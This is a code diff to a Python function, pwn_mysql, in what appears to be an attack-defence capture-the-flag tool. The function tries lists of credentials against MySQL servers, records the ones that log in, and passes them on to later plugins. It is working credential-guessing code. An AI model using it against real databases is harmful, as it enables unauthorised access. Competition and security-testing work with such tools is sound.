@@ -111,6 +111,7 @@ def pwn_mysql(url: str, port: int, service: Service, flag_conf: FlagConf,
     context.update({
         'credentials': credentials,
     })
+    to_post = []
 
     for credential in credentials:
         # Govern if necessary (and enabled)
@@ -124,16 +125,23 @@ def pwn_mysql(url: str, port: int, service: Service, flag_conf: FlagConf,
 
         try:
             logger.debug("Attempting {} with creds: {}".format(url, cred))
-            mysql.connector.connect(host=url, port=port, user=credential.username, passwd=credential.password)
+            db = mysql.connector.connect(host=url, port=port, user=credential.username, passwd=credential.password)
             cred.state = Credential.WORKS
             cred.save()
             working.add(cred)
+            to_post.append({'url': url, 'port': port, 'user': credential.username, 'passwd': credential.password})
+            db.disconnect()
         except mysql.connector.errors.InterfaceError as e:
             return f"Unable to connect: {e}", False, False
+        except mysql.connector.errors.DatabaseError as e:
+            logger.debug("Failed to authenticate with creds %s: %s", cred, e)
+            continue
         except Exception:
             logger.exception("There was an error pwning this service: %s", url)
 
     if working:
+        # TODO: This is a hack, the way post plugins and pwn functions work needs to change
+        context.update({'credentials': to_post})
         return "Found credentials: {}".format(working), True, False
     else:
         return 'Authentication failed', False, False
